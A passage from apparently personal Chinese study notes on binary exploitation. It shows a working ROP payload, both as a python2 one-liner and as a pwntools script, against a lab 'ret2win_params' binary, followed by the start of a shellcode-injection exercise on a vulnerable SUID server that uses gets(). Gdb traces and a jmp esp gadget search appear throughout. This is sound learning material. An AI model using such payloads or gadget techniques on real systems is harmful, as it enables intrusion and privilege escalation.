</span><br></pre></td></tr></table></figure></div><blockquote><p>但是由于这里还执行了其他的命令，pop r15；ret；</p><p>可以传入一些垃圾字符进去</p></blockquote><ul><li>执行<code>pop rsi</code>操作和几个其他命令的地址</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401249</span><br></pre></td></tr></table></figure></div><ul><li><p>继续补全脚本</p><blockquote><p>整个脚本的逻辑：</p><p>垃圾字符 + pop_rdi的地址 + 我们第一个对比的值 + pop_rsi的地址 + 我们第二个对比的值 + 8个字符的垃圾数据 + hacked函数的地址</p></blockquote></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -c &#x27;print &quot;A&quot; * 24 + &quot;\x4b\x12\x40\x00\x00\x00\x00\x00&quot; + &quot;\xef\xbe\xad\xde\xef\xbe\xad\xde&quot; + &quot;\x49\x12\x40\x00\x00\x00\x00\x00&quot; + &quot;\xbe\xba\xde\xc0\xbe\xba\xde\xc0&quot; + &quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot; + &quot;\x42\x11\x40\x00\x00\x00\x00\x00&quot;&#x27; &gt; exp</span><br></pre></td></tr></table></figure></div><blockquote><p>hacked函数地址要在最后的原因是，</p><p>如果我们放到第一个，程序跳转之后就不会执行我们后续的操作了，</p><p>所以我们要将需要执行的操作都执行后，再跳转</p></blockquote><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 对脚本的详细解释 （来自ai）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 缓冲区溢出：</span></span><br><span class="line">	你通过输入<span class="number">24</span>个 A 来填充缓冲区，使其溢出并覆盖返回地址。</span><br><span class="line"><span class="comment"># 控制返回地址：</span></span><br><span class="line">	你使用 pop rdi 的地址（假设为 <span class="number">0x40124b</span>）来覆盖返回地址，使程序跳转到 pop rdi 指令。</span><br><span class="line"><span class="comment"># 设置 rdi 寄存器：</span></span><br><span class="line">	pop rdi 指令会从栈中弹出一个值并赋值给 rdi。你在这里提供了一个值 <span class="number">0xdeadbeefdeadbeef</span>，这个值将会被赋值给 rdi。</span><br><span class="line"><span class="comment"># 设置 rsi 寄存器：</span></span><br><span class="line">	你使用 pop rsi; pop r15; ret; 的地址（<span class="number">0x401249</span>）来覆盖 pop rdi 指令的返回地址，使程序跳转到 pop rsi; pop r15; ret; 指令。</span><br><span class="line">	pop rsi 指令会从栈中弹出一个值并赋值给 rsi。你在这里提供了一个值 <span class="number">0xc0debabec0debabe</span>，这个值将会被赋值给 rsi。</span><br><span class="line">	pop r15 指令会从栈中弹出一个值并赋值给 r15。为了不影响后续的操作，你在这里提供<span class="number">8</span>个垃圾字符（<span class="number">0x0000000000000000</span>）。</span><br><span class="line"><span class="comment"># 调用 hacked 函数：</span></span><br><span class="line">	最后，你使用 hacked 函数的地址（假设为 <span class="number">0x401142</span>）来覆盖 pop rsi; pop r15; ret; 指令的返回地址，使程序跳转到 hacked 函数。</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 为什么需要8个垃圾字符</span></span><br><span class="line">- pop r15; ret; 指令会从栈中弹出两个值：</span><br><span class="line">	- 第一个值赋值给 rsi。</span><br><span class="line">	- 第二个值赋值给 r15。</span><br><span class="line">- 为了不影响后续的操作，你需要提供一个<span class="number">8</span>字节的值来填充 r15。这个值可以是任意的，通常使用<span class="number">8</span>个零（<span class="number">0x0000000000000000</span>）作为垃圾字符。</span><br></pre></td></tr></table></figure></div><ul><li><p>脚本调用<code>pop rdi</code>之类的指令，从内存弹出的值都是写入的值</p><ul><li>程序原本的值都被覆盖了，按照顺序弹</li></ul></li><li><p>在程序主函数的最后的地址下一个断点，方便调试，然后我们执行程序，并导入文件里的数据</p></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">gef➤  disassemble register_name </span><br><span class="line">Dump of assembler code for function register_name:</span><br><span class="line">   0x0000000000401190 &lt;+0&gt;:	push   rbp</span><br><span class="line">   0x0000000000401191 &lt;+1&gt;:	mov    rbp,rsp</span><br><span class="line">   0x0000000000401194 &lt;+4&gt;:	sub    rsp,0x10</span><br><span class="line">   0x0000000000401198 &lt;+8&gt;:	lea    rdi,[rip+0xefa]        # 0x402099</span><br><span class="line">   0x000000000040119f &lt;+15&gt;:	call   0x401030 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004011a4 &lt;+20&gt;:	lea    rax,[rbp-0x10]</span><br><span class="line">   0x00000000004011a8 &lt;+24&gt;:	mov    rsi,rax</span><br><span class="line">   0x00000000004011ab &lt;+27&gt;:	lea    rdi,[rip+0xeed]        # 0x40209f</span><br><span class="line">   0x00000000004011b2 &lt;+34&gt;:	mov    eax,0x0</span><br><span class="line">   0x00000000004011b7 &lt;+39&gt;:	call   0x401050 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x00000000004011bc &lt;+44&gt;:	lea    rax,[rbp-0x10]</span><br><span class="line">   0x00000000004011c0 &lt;+48&gt;:	mov    rsi,rax</span><br><span class="line">   0x00000000004011c3 &lt;+51&gt;:	lea    rdi,[rip+0xed8]        # 0x4020a2</span><br><span class="line">   0x00000000004011ca &lt;+58&gt;:	mov    eax,0x0</span><br><span class="line">   0x00000000004011cf &lt;+63&gt;:	call   0x401040 &lt;printf@plt&gt;</span><br><span class="line">   0x00000000004011d4 &lt;+68&gt;:	nop</span><br><span class="line">   0x00000000004011d5 &lt;+69&gt;:	leave</span><br><span class="line">   0x00000000004011d6 &lt;+70&gt;:	ret</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gef➤  b *0x00000000004011d6</span><br><span class="line">Breakpoint 1 at 0x4011d6</span><br><span class="line"></span><br><span class="line">run &lt; exp</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">●→   0x4011d6 &lt;register_name+0046&gt; ret    </span><br><span class="line">   ↳    0x40124b &lt;__libc_csu_init+005b&gt; pop    rdi ▷</span><br><span class="line">        0x40124c &lt;__libc_csu_init+005c&gt; ret    </span><br><span class="line">        0x40124d                  nop    DWORD PTR [rax]</span><br><span class="line">        0x401250 &lt;__libc_csu_fini+0000&gt; ret    </span><br><span class="line">        0x401251                  add    BYTE PTR [rax], al</span><br><span class="line">        0x401253                  add    BYTE PTR [rax-0x7d], cl</span><br><span class="line">        ......</span><br><span class="line">↳   	0x401249 &lt;__libc_csu_init+0059&gt; pop    rsi ▷</span><br><span class="line">        0x40124a &lt;__libc_csu_init+005a&gt; pop    r15</span><br><span class="line">        ......</span><br><span class="line">↳    	0x401142 &lt;hacked+0000&gt;    push   rbp  ▷</span><br><span class="line">    →   0x401143 &lt;hacked+0001&gt;    mov    rbp, rsp</span><br><span class="line">         0x401146 &lt;hacked+0004&gt;    sub    rsp, 0x10</span><br><span class="line">         0x40114a &lt;hacked+0008&gt;    mov    QWORD PTR [rbp-0x8], rdi  ▷</span><br><span class="line">         0x40114e &lt;hacked+000c&gt;    mov    QWORD PTR [rbp-0x10], rsi</span><br><span class="line">         0x401152 &lt;hacked+0010&gt;    movabs rax, 0xdeadbeefdeadbeef</span><br><span class="line">         0x40115c &lt;hacked+001a&gt;    cmp    QWORD PTR [rbp-0x8], rax  ▷</span><br></pre></td></tr></table></figure></div><ul><li>程序在执行了我们指定的操作后，才跳转到<code>hacked</code>函数的地址</li><li>一直按<code>n</code>直到<code>call 0x401030 &lt;puts@plt&gt;</code>，成功破解程序</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">puts@plt (</span><br><span class="line">   $rdi = 0x0000000000402008 → &quot;This function is TOP SECRET! How did you get in he[...]&quot;,</span><br><span class="line">   $rsi = 0xc0debabec0debabe</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div><ul><li>直接执行程序+导入文件</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜  64-bit git:(master) ✗ ./ret2win_params &lt; exp</span><br><span class="line">Name:</span><br><span class="line">Hi there, AAAAAAAAAAAAAAAAAAAAAAAAK@</span><br><span class="line">This function is TOP SECRET! How did you get in here?! :O</span><br><span class="line">[1]    7422 illegal hardware instruction (core dumped)  ./ret2win_params &lt; exp</span><br></pre></td></tr></table></figure></div><h4 id="pwntools脚本-v4"><a class="header-anchor" href="#pwntools脚本-v4">¶</a>pwntools脚本</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ret2win_params&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;A&quot;</span> * <span class="number">24</span> + <span class="string">b&quot;\x4b\x12\x40\x00\x00\x00\x00\x00&quot;</span> + <span class="string">b&quot;\xef\xbe\xad\xde\xef\xbe\xad\xde&quot;</span> + <span class="string">b&quot;\x49\x12\x40\x00\x00\x00\x00\x00&quot;</span> + <span class="string">b&quot;\xbe\xba\xde\xc0\xbe\xba\xde\xc0&quot;</span> + <span class="string">b&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span> + <span class="string">b&quot;\x42\x11\x40\x00\x00\x00\x00\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(io.recvall())</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜  python3 exp.py</span><br><span class="line">[+] Starting local process &#x27;./ret2win_params&#x27;: pid 7682</span><br><span class="line">[+] Receiving all data: Done (102B)</span><br><span class="line">[*] Process &#x27;./ret2win_params&#x27; stopped with exit code -7 (SIGBUS) (pid 7682)</span><br><span class="line">b&#x27;Name:\nHi there, AAAAAAAAAAAAAAAAAAAAAAAAK\x12@\nThis function is TOP SECRET! How did you get in here?! :O\n&#x27;</span><br></pre></td></tr></table></figure></div><hr><h1>240925-240926</h1><p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45894840/article/details/126830498?spm=1001.2014.3001.5501">PWN入门（6）写入shellcode_pwntools shellcode-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><hr><h2 id="写入shellcode"><a class="header-anchor" href="#写入shellcode">¶</a>写入shellcode</h2><h3 id="SUID"><a class="header-anchor" href="#SUID">¶</a>SUID</h3><ul><li>将<code>flag</code>设置位只<code>root</code>可读</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chown root:root flag.txt</span><br><span class="line">chown root:root server</span><br></pre></td></tr></table></figure></div><ul><li>设置程序位<code>suid</code>位</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 4655 server </span><br></pre></td></tr></table></figure></div><ul><li>what is <code>setuid</code></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setuid代表设置用户身份，并且setuid设置调用进程的有效用户ID，用户运行程序的uid与调用进程的真实uid不匹配</span><br></pre></td></tr></table></figure></div><ul><li><code>setuid</code>的使用示例</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一个要以root权限运行的程序，但我们想让普通用户也能运行它，但又要防止该程序被攻击者利用，这里就需要用setuid</span><br></pre></td></tr></table></figure></div><ul><li>查看后台进程</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(base) ➜  ~ ps -aux</span><br><span class="line"></span><br><span class="line">xaut        3799  1.3  0.0  27356 13056 pts/0    Sl+  19:20   0:00 vim 1.test</span><br><span class="line">root        3804  0.0  0.0      0     0 ?        I    19:20   0:00 [kworker/1:2]</span><br><span class="line">root        3808  0.0  0.0      0     0 ?        I    19:20   0:00 [kworker/0:1]</span><br><span class="line">xaut        3819  3.0  0.0  13400  6740 pts/1    Ss   19:20   0:00 zsh</span><br><span class="line">xaut        3861  400  0.0  15104  5504 pts/1    R+   19:20   0:00 ps -aux</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xaut        3799  1.3  0.0  27356 13056 pts/0    Sl+  19:20   0:00 vim 1.test</span><br><span class="line">(此时另一个窗口正在运行vim)</span><br><span class="line">--&gt; vim正在以user的权限运行中</span><br></pre></td></tr></table></figure></div><h3 id="获取文件信息-v2"><a class="header-anchor" href="#获取文件信息-v2">¶</a>获取文件信息</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜   checksec server</span><br><span class="line">/pwn/binary_exploitation_101/05-injecting_custom_shellcode/server&#x27;</span><br><span class="line"></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">32位程序</span><br><span class="line">部分RELRO，基本上所有程序都默认的有这个</span><br><span class="line">没有开启栈保护</span><br><span class="line">未启用数据执行</span><br><span class="line">没有pie，意思是程序的内存空间不会被随机化</span><br><span class="line">有读，写，和执行的段，意思是我们可以在程序里写入shellcode ▷</span><br></pre></td></tr></table></figure></div><ul><li>查看源代码</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// --&gt; cat server.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">secret_function</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;jmp %esp&quot;</span>);    <span class="comment">// 汇编语言，意思是跳转到esp寄存器的地址里执行内容</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">receive_feedback</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">64</span>];    定义了一个变量，名为buffer，有<span class="number">64</span>个字节的缓冲区</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please leave your comments for the server admin but DON&#x27;T try to steal our flag.txt:\n&quot;</span>);   <span class="comment">//输出字符</span></span><br><span class="line">    gets(buffer);   <span class="comment">//获取我们输入的内容</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);    <span class="comment">//保证程序以root身份运行</span></span><br><span class="line">    setgid(<span class="number">0</span>);    <span class="comment">//保证程序以root身份运行</span></span><br><span class="line"></span><br><span class="line">    receive_feedback();    <span class="comment">//调用receive_feedback()函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>一篇关于程序的堆栈的文章</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://courses.engr.illinois.edu/cs225/fa2022/resources/stack-heap/</span><br></pre></td></tr></table></figure></div><h3 id="动态调试-v6"><a class="header-anchor" href="#动态调试-v6">¶</a>动态调试</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb server</span><br></pre></td></tr></table></figure></div><ul><li>获取测试用的字符串并运行程序</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cyclic 100</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$eax   : 0xffffca80  →  &quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]&quot;</span><br><span class="line">$ebx   : 0x61616172 (&quot;raaa&quot;?)</span><br><span class="line">$ecx   : 0xf7fa58ac  →  0x00000000</span><br><span class="line">$edx   : 0x0       </span><br><span class="line">$esp   : 0xffffcad0  →  &quot;uaaavaaawaaaxaaayaaa&quot;</span><br><span class="line">$ebp   : 0x61616173 (&quot;saaa&quot;?)</span><br><span class="line">$esi   : 0x08049230  →  &lt;__libc_csu_init+0000&gt; push ebp</span><br><span class="line">$edi   : 0xf7ffcb60  →  0x00000000</span><br><span class="line">$eip   : 0x61616174 (&quot;taaa&quot;?)</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">─────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">[!] Cannot disassemble from $PC</span><br><span class="line">[!] Cannot access memory at address 0x61616174</span><br></pre></td></tr></table></figure></div><ul><li><p><code>eip</code>指针原来的返回地址被覆盖成了<code>taaa</code></p></li><li><p>查一下<code>taaa</code>在刚刚生成的字符的第几个</p></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜  cyclic -l taaa</span><br><span class="line">76</span><br></pre></td></tr></table></figure></div><blockquote><p>说明要覆盖eip原本的返回地址并控制</p><p>就需要76个字符+想让程序跳转执行的地址</p></blockquote><ul><li>一个<code>python</code>测试脚本</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 -c <span class="string">&quot;print &#x27;A&#x27; * 76 + &#x27;BBBB&#x27; + &#x27;C&#x27; * 100&quot;</span></span><br><span class="line"><span class="comment"># A 是覆盖函数缓冲区空间的，B是要跳转的地址，C是要写入的shellcode字符</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">--&gt; run </span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">───────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$eax   : 0xffffca80  →  &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span><br><span class="line">$ebx   : 0x41414141 (&quot;AAAA&quot;?)</span><br><span class="line">$ecx   : 0xf7fa58ac  →  0x00000000</span><br><span class="line">$edx   : 0x0       </span><br><span class="line">$esp   : 0xffffcad0  →  &quot;CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]&quot;</span><br><span class="line">$ebp   : 0x41414141 (&quot;AAAA&quot;?)</span><br><span class="line">$esi   : 0x08049230  →  &lt;__libc_csu_init+0000&gt; push ebp</span><br><span class="line">$edi   : 0xf7ffcb60  →  0x00000000</span><br><span class="line">$eip   : 0x42424242 (&quot;BBBB&quot;?)</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">[!] Cannot disassemble from $PC</span><br><span class="line">[!] Cannot access memory at address 0x42424242</span><br></pre></td></tr></table></figure></div><ul><li><code>eip</code>的地址是<code>B</code>，堆栈里的内容就是<code>C</code></li><li>需要让程序调用<code>jmp esp</code>那个汇编指令，然后程序就会执行堆栈里的内容</li><li>两个方法：<ul><li>可以使用<u><strong>程序内的函数</strong></u>来跳转到堆栈里</li><li>也可以<u><strong>使用其他地址的指令</strong></u>来跳转到堆栈里</li></ul></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper --file server --search &quot;jmp esp&quot;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜  ropper --file server --search &quot;jmp esp&quot;</span><br><span class="line"></span><br><span class="line">[INFO] Load gadgets for section: LOAD</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[INFO] Load gadgets for section: GNU_STACK</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[LOAD] removing double gadgets... 100%</span><br><span class="line">[INFO] Searching for gadgets: jmp esp</span><br><span class="line"></span><br><span class="line">[INFO] File: server</span><br><span class="line">0x0804919f: jmp esp; </span><br></pre></td></tr></table></figure></div><blockquote><p>使用程序内的函数来跳转到堆栈里</p></blockquote></div><div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8"><div class="article-copyright-info-container"><ul><li><strong>标题:</strong> 【Pvvn】可能是学习笔记吧</li><li><strong>作者:</strong> The Redefine Team</li><li><strong>创建于 :</strong> 2024-09-22 00:00:00</li><li><strong>更新于 :</strong> 2024-09-27 21:27:40</li><li><strong>链接:</strong> https://redefine.ohevan.com/2024/09/22/CS_Notes/PWN/【Pvvn】可能是学习笔记吧/</li><li><strong>版权声明: </strong>本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。</li></ul></div></div><ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden"><li class="tag-item mx-0.5"><a href="/tags/CS-Notes/">#CS Notes</a>&nbsp;</li><li class="tag-item mx-0.5"><a href="/tags/Pwn/">#Pwn</a>&nbsp;</li></ul><div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8"><div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2"><a class="prev" rel="prev" href="/2024/09/25/CS_Notes/Database/%E3%80%90%E6%95%B0%E6%8D%AE%E5%BA%93%E3%80%91%E4%B8%BA%E4%BA%86%E8%80%83%E8%AF%95+%E5%81%9A%E9%A1%B9%E7%9B%AE%E7%89%88/"><span class="left arrow-icon flex justify-center items-center"><i class="fa-solid fa-chevron-left"></i> </span><span class="title flex justify-center items-center"><span class="post-nav-title-item">【数据库】为了考试+做项目版</span> <span class="post-nav-item">上一篇</span></span></a></div><div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2"><a class="next" rel="next" href="/2024/09/21/CS_Notes/wenlv_Project/%E3%80%90%E6%96%87%E6%97%85%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%BA%94%E7%94%A8%E3%80%91240922%E5%86%85%E5%AE%B9%E5%88%86%E4%BA%AB/"><span class="title flex justify-center items-center"><span class="post-nav-title-item">【大模型应用】240922内容分享</span> <span class="post-nav-item">下一篇</span> </span><span class="right arrow-icon flex justify-center items-center"><i class="fa-solid fa-chevron-right"></i></span></a></div></div><div class="comment-container px-2 sm:px-6 md:px-8 pb-8"><div class="comments-container mt-10 w-full"><div id="comment-anchor" class="w-full h-2.5"></div><div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">评论</div><div id="waline"></div><script type="module" data-swup-reload-script>import{init}from"/js/libs/waline.mjs";function loadWaline(){init({el:"#waline",serverURL:"https://example.example.com",lang:"zh-CN",dark:'body[class~="dark-mode"]',reaction:!1,requiredMeta:["nick","mail"],emoji:[],recaptchaV3Key:"wasd"})}"undefined"!=typeof 